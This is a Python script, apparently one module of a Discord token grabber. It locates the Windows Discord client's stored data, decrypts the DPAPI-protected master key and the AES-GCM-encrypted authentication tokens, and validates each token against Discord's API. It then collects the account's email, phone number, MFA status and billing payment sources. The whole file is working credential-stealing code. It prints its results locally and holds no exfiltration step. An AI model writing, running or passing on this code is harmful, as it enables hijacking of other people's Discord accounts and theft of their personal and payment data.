import os
import re
import json
import base64
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import requests
from pprint import pprint
from libs import discord_account_utils


def get_token():
    encPattern = r'dQw4w9WgXcQ:[^\"]*'
    dbPath = os.path.normpath(r"%s\AppData\Roaming\discord\Local Storage\leveldb"%(os.environ['USERPROFILE']))
    statePath = os.path.normpath(r"%s\AppData\Roaming\discord\Local State" % (os.environ['USERPROFILE']))
    with open(statePath, 'r') as f:
        state = f.read()
    state = json.loads(state)
    master_key = base64.b64decode(state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    for file_name in os.listdir(dbPath):
        if file_name[-3:] not in ["log", "ldb"]:
            continue
        for line in [x.strip() for x in open(f'{dbPath}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for y in re.findall(encPattern, line):
                enc_token = base64.b64decode(y.split('dQw4w9WgXcQ:')[1])
                iv = enc_token[3:15]
                payload = enc_token[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decr_token = cipher.decrypt(payload)
                decr_token = decr_token[:-16].decode()
                if check_token(decr_token):
                    return decr_token


def check_token(token):
    url = "https://discord.com/api/v9/users/@me"
    headers = {
        "Authorization": token,
    }
    r = requests.get(url, headers=headers)

    if r.status_code != 401:
        return True
    else:
        return False


def get_user_info(token):
    url = "https://discord.com/api/v9/users/@me"
    headers = {
        "Authorization": token,
    }
    r = requests.get(url, headers=headers)
    userData = r.json()
    profileInfo = {'username': userData['username'],
                   'display name': userData['global_name'],
                   'id': userData['id'],
                   'premium': discord_account_utils.premium[userData['premium_type']],
                   'mfa': userData['mfa_enabled'],
                   'email': userData['email'],
                   'phone': userData['phone'],
                   'flags': discord_account_utils.parse_flags(userData['flags'])}
    return profileInfo



def get_payment(token):
    url = "https://discord.com/api/v9/users/@me/billing/payment-sources"
    headers = {
        "Authorization": token,
    }
    r = requests.get(url, headers=headers)
    userData = r.json()
    return userData



def get_discord():
    data = {}
    token = get_token()
    if not token:
        return None
    print("Token: " + token)
    data['token'] = token
    data['profile'] = get_user_info(token)
    data['payment'] = get_payment(token)
    return data


def test_api(token):
    url = "https://discord.com/api/v9/users/@me"
    headers = {
        "Authorization": token,
    }
    r = requests.get(url, headers=headers)
    userData = r.json()
    pprint(userData)
    print(r.status_code)


if __name__ == '__main__':
    pprint(get_discord())
    # test_api(token)